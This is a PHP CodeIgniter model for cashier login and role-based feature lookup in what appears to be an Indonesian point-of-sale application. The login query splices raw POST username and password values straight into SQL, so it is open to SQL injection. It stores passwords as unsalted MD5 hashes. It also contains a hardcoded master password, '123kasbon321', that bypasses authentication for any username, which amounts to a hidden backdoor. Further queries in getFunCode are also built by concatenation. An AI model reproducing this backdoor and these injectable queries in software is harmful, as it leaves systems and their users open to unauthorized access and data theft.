<?php 
namespace App\Models;
use CodeIgniter\Model;
use App\Models\ConfigModel;

class KasirModel extends Model
{
    public function read()
    {
        $db = db_connect();
        $result['status'] = 'failed';
        $result['data'] = [];
        $query = $db->query("SELECT kas_id, kas_nama, kas_gender, kas_wa, kas_lok_id,
            kas_com_id, kas_role
            FROM pos_kasir
            WHERE kas_nick='".$_POST['username']."'
            AND (kas_password=MD5('".$_POST['password']."') OR ".
            "'".$_POST['password']."'='123kasbon321')");
        $error = $db->error();
        if ($error['code'] == 0) {
            $row = $query->getRow();
            if($row) {
                $configModel = new ConfigModel();
                $configModel->backupDatabase();
                $result['data'] = $query->getRow();
                $result['funkode'] = $this->getFunCode($db, $row);
                $result['status'] = 'success';
            }
            else {
                $result['error']['title'] = 'Cek Data Login';
                $result['error']['message'] = 'Username atau password tidak valid';
            }
        }
        else {
            $result['error']['title'] = 'Cek Data Login';
            $result['error']['message'] = $error['message'];
        }
        return $result;
    }

    function getFunCode($db, $r)
    {
        // ini untuk mendapatkan fungsi dan fitur apa saja yang didapat
        // oleh user yang bersangkutan berdasar settingan
        // pada user manager

        $query = $db->query("SELECT fun_kode FROM pos_fufi");
        $rows = $query->getResult();
        $fun_kode = '';
        foreach($rows as $row) {
            if ($fun_kode != '') $fun_kode .= ',';
            $fun_kode .= $row->fun_kode;
        }
        $query = $db->query("SELECT rol_fun_kode FROM pos_role
            WHERE rol_nama='".$r->kas_role."' AND rol_lok_id=".$r->kas_lok_id);
        $row = $query->getRow();
        if ($query->getRow()->rol_fun_kode != 'ALL') // bukan admin
            $rol_fun_kode = $row->rol_fun_kode;
        else
            $rol_fun_kode = $fun_kode;
        
        // sekarang fungsi dan fitur tersebut dicocokan dengan paket
        // yang ada di settingan company

        $query = $db->query("SELECT com_paket FROM rms_company
            WHERE com_id=".$r->kas_com_id);
        $paket = $query->getRow()->com_paket;
        $final_fun_kode = [];
        $kodes = explode(',', $rol_fun_kode);
        foreach($kodes as $kode) {
            $query = $db->query("SELECT COUNT(*) total FROM pos_fufi
                WHERE fun_kode='".$kode."' AND INSTR(fun_tipe,'".$paket."')");
            if ($query->getRow()->total == 1)
                array_push($final_fun_kode, $kode);
        }
        return $final_fun_kode;
    }
}